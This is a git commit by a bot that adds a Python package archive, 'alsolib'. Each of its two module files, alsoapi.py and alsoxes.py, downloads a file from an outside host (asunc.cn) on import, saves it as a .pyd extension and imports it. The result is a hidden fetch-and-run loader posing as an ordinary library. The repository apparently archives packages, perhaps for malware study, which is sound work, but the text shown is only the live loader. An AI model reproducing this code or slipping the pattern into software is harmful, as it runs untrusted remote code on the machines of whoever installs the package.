523c4e29a2474661f554ca20df7c49ecbb5c4dbb
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 15:06:32 +0000

    Add package alsolib/1.2.20200920/alsolib-1.2.20200920.tar.gz

---
+++ packages/alsolib/alsolib-1.2.20200920.tar.gz/alsolib-1.2.20200920/alsolib/alsoapi.py
@@ -0,0 +1,3 @@
+import urllib.request
+urllib.request.urlretrieve('http://www.asunc.cn/alsoapi37.txt', 'alsoapi.pyd')
+from alsoapi import*
---
+++ packages/alsolib/alsolib-1.2.20200920.tar.gz/alsolib-1.2.20200920/alsolib/alsoxes.py
@@ -0,0 +1,3 @@
+import urllib.request
+urllib.request.urlretrieve('http://www.asunc.cn/alsoxes37.txt','alsoxes.pyd')
+from alsoxes import*
